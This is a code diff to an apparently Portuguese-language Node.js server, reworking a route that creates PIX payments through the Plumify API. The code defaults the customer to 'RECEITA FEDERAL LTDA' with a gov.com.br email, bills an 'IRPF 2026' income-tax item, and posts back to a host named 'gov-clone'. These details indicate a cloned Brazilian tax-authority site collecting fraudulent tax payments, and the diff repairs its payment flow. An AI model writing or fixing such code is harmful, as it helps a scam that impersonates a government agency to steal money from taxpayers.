@@ -233,7 +233,7 @@ function generateTransactionId() {
     return 'TX-' + Date.now() + '-' + crypto.randomBytes(4).toString('hex');
 }
 
-// Rota para criar pagamento via Plumify (CORRIGIDA)
+// Rota para criar pagamento via Plumify (CORRETA - com token na URL)
 app.post('/api/create-payment', async (req, res) => {
     const { amount, customer_name, customer_email, customer_cpf } = req.body;
 
@@ -241,56 +241,67 @@ app.post('/api/create-payment', async (req, res) => {
         return res.status(400).json({ error: 'Valor inválido' });
     }
 
-    try {
-        const payload = {
+    // Valores em CENTAVOS (15000 = R$ 150,00)
+    const amountCents = Math.round(parseFloat(amount) * 100);
+
+    const payload = {
+        amount: amountCents,
+        offer_hash: PLUMIFY_PRODUCT_HASH,  // Atenção: é offer_hash, não product_hash!
+        payment_method: 'pix',
+        customer: {
+            name: customer_name || 'RECEITA FEDERAL LTDA',
+            email: customer_email || 'receitafederal@gov.com.br',
+            phone_number: '21999999999',
+            document: customer_cpf || '00000000000'
+        },
+        cart: [{
             product_hash: PLUMIFY_PRODUCT_HASH,
-            amount: parseFloat(amount),
-            currency: 'BRL',
-            reference_id: generateTransactionId(),
-            customer: {
-                name: customer_name || 'RECEITA FEDERAL LTDA',
-                email: customer_email || 'receitafederal@gov.com.br',
-                cpf: customer_cpf || '00000000000'
+            title: 'Imposto de Renda Pessoa Física - IRPF 2026',
+            price: amountCents,
+            quantity: 1,
+            operation_type: 1,
+            tangible: false
+        }],
+        expire_in_days: 1,
+        transaction_origin: 'api',
+        postback_url: 'https://gov-clone-81e8.onrender.com/api/webhook/pagamento'
+    };
+
+    console.log('📤 Enviando para Plumify:', JSON.stringify(payload, null, 2));
+
+    try {
+        // Token vai na URL, não no header!
+        const response = await fetch(`https://api.Plumify.com.br/api/public/v1/transactions?api_token=${PLUMIFY_API_TOKEN}`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+                'Accept': 'application/json'
             },
-            items: [{
-                description: 'Imposto de Renda Pessoa Física - IRPF 2026',
-                quantity: 1,
-                amount: parseFloat(amount)
-            }],
-            payment_methods: ['pix']
-        };
-
-        console.log('📤 Enviando para Plumify:', JSON.stringify(payload, null, 2));
-
-        // Tentar diferentes endpoints
-        let response;
-        try {
-            response = await fetch(`https://api.plumify.com.br/api/transactions`, {
-                method: 'POST',
-                headers: {
-                    'Authorization': `Bearer ${PLUMIFY_API_TOKEN}`,
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(payload)
-            });
-        } catch(e) {
-            response = await fetch(`https://api.plumify.com.br/v1/transactions`, {
-                method: 'POST',
-                headers: {
-                    'Authorization': `Bearer ${PLUMIFY_API_TOKEN}`,
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(payload)
-            });
-        }
+            body: JSON.stringify(payload)
+        });
 
         const data = await response.json();
         console.log('📥 Resposta Plumify:', data);
 
-        res.json({
-            success: true,
-            payment: data
-        });
+        // A resposta para PIX deve conter pix_qrcode e pix_code
+        if (data.pix_qrcode || data.pix_code) {
+            res.json({
+                success: true,
+                payment: {
+                    pix_code: data.pix_code,
+                    pix_qrcode: data.pix_qrcode,
+                    expires_at: data.expires_at,
+                    id: data.hash,
+                    status: data.status
+                }
+            });
+        } else {
+            res.json({
+                success: false,
+                error: data.message || 'Erro ao gerar PIX',
+                details: data
+            });
+        }
 
     } catch (error) {
         console.error('Erro Plumify:', error.message);
